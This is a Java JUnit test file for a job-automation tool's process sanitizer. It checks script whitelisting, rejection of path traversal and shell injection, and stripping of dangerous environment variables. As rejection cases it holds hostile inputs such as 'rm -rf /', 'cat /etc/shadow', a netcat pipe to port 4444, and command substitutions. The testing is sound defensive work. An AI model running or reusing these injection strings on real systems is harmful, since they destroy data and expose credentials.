package com.jobautomator.security;

import com.jobautomator.exception.SecurityValidationException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class ProcessSanitizerTest {

    private ProcessSanitizer sanitizer;

    @BeforeEach
    void setUp() {
        sanitizer = new ProcessSanitizer(Paths.get(".").toAbsolutePath());
    }

    @Test
    @DisplayName("Should successfully validate approved whitelist script")
    void shouldValidateApprovedScript() {
        String result = sanitizer.validateAndSanitizeScriptPath("src/browsergym_service.py");
        assertThat(result).isEqualTo("src/browsergym_service.py");

        String gmailResult = sanitizer.validateAndSanitizeScriptPath("src/gmail_monitor.py");
        assertThat(gmailResult).isEqualTo("src/gmail_monitor.py");
    }

    @Test
    @DisplayName("Should reject directory traversal attempts with ../")
    void shouldRejectDirectoryTraversal() {
        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("../outside.py"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("Directory traversal");

        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/../../etc/passwd.py"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("Directory traversal");
    }

    @Test
    @DisplayName("Should reject scripts with command injection metacharacters")
    void shouldRejectCommandInjectionInPath() {
        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/browsergym_service.py; rm -rf /"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("illegal characters");

        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/browsergym_service.py & calc.exe"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("illegal characters");

        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/`whoami`.py"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("illegal characters");
    }

    @Test
    @DisplayName("Should reject non-python extensions")
    void shouldRejectNonPythonExtensions() {
        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/script.sh"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("Only Python (.py) scripts are permitted");

        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/binary.exe"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("Only Python (.py) scripts are permitted");
    }

    @Test
    @DisplayName("Should reject unapproved scripts not in whitelist")
    void shouldRejectUnapprovedScript() {
        assertThatThrownBy(() -> sanitizer.validateAndSanitizeScriptPath("src/untrusted_crypto_miner.py"))
                .isInstanceOf(SecurityValidationException.class)
                .hasMessageContaining("not in the whitelist of approved scripts");
    }

    @Test
    @DisplayName("Should sanitize safe argument successfully")
    void shouldSanitizeSafeArgument() {
        String safeArg = sanitizer.sanitizeArgument("--job-id=linkedin-98231");
        assertThat(safeArg).isEqualTo("--job-id=linkedin-98231");

        String safeUrl = sanitizer.sanitizeArgument("https://www.linkedin.com/jobs/view/12345678");
        assertThat(safeUrl).isEqualTo("https://www.linkedin.com/jobs/view/12345678");
    }

    @Test
    @DisplayName("Should reject arguments with shell metacharacters")
    void shouldRejectMaliciousArguments() {
        assertThatThrownBy(() -> sanitizer.sanitizeArgument("jobId; cat /etc/shadow"))
                .isInstanceOf(SecurityValidationException.class);

        assertThatThrownBy(() -> sanitizer.sanitizeArgument("arg | netcat 10.0.0.1 4444"))
                .isInstanceOf(SecurityValidationException.class);

        assertThatThrownBy(() -> sanitizer.sanitizeArgument("$(id)"))
                .isInstanceOf(SecurityValidationException.class);

        assertThatThrownBy(() -> sanitizer.sanitizeArgument("foo`touch /tmp/pwned`"))
                .isInstanceOf(SecurityValidationException.class);
    }

    @Test
    @DisplayName("Should validate Job ID correctly")
    void shouldValidateJobId() {
        assertThat(sanitizer.validateJobId("linkedin-12345")).isEqualTo("linkedin-12345");
        assertThat(sanitizer.validateJobId("job_987")).isEqualTo("job_987");

        assertThatThrownBy(() -> sanitizer.validateJobId("job-123; rm -rf /"))
                .isInstanceOf(SecurityValidationException.class);
    }

    @Test
    @DisplayName("Should strip unapproved environment variables and keep safe variables")
    void shouldSanitizeEnvironmentVariables() {
        Map<String, String> taintedEnv = Map.of(
                "PATH", "C:\\Windows\\System32",
                "OPENAI_API_KEY", "sk-proj-test-12345",
                "LD_PRELOAD", "/tmp/malicious.so",
                "NODE_OPTIONS", "--inspect=0.0.0.0",
                "SUPABASE_URL", "https://xyz.supabase.co"
        );

        Map<String, String> cleanEnv = sanitizer.buildSanitizedEnvironment(taintedEnv);

        assertThat(cleanEnv).containsKey("PATH");
        assertThat(cleanEnv).containsKey("OPENAI_API_KEY");
        assertThat(cleanEnv).containsKey("SUPABASE_URL");
        assertThat(cleanEnv).doesNotContainKey("LD_PRELOAD");
        assertThat(cleanEnv).doesNotContainKey("NODE_OPTIONS");
    }

    @Test
    @DisplayName("Should resolve python executable")
    void shouldResolvePythonExecutable() {
        String exe = sanitizer.resolvePythonExecutable();
        assertThat(exe).isNotBlank();
    }
}
